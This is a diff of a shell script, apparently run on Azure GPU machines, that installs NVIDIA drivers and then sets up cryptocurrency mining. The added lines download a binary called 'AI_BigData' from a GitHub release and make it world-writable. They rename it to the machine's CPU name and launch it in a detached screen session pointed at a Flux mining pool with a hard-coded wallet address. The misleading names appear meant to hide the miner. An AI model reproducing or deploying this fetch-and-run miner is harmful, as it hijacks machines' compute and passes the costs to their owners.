@@ -15,16 +15,13 @@ sudo ./NVIDIA-Linux-x86_64-470.82.01-grid-azure.run --dkms -s --no-opengl-files
 rm -r /usr/share/work/$azure
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/platinum
-wget wget https://github.com/wollfoo/wolethv100/releases/download/bbzz/platinum.tar.gz
-mv platinum.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf platinum.tar.gz
-rm -rf platinum.tar.gz && cd platinum
-mv nanominer $azure -n
+wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/AI_BigData
+mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
+mv AI_BigData $azure -n
 cp $azure "$cpuname"
-rm -f  nanominer
+rm -f  AI_BigData
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}"
+screen -d -m ./"${cpuname}" --user t1SzPN5ZrAccHeSGPcxwzuwL9Qk54GUzEJi.bbzz --ssl --server eu-flux.fluxpools.net --port 7003 --pass wow --algo 125_4 --pers ZelProof
 
 #!/bin/bash
 docker rm -f cpudataissa
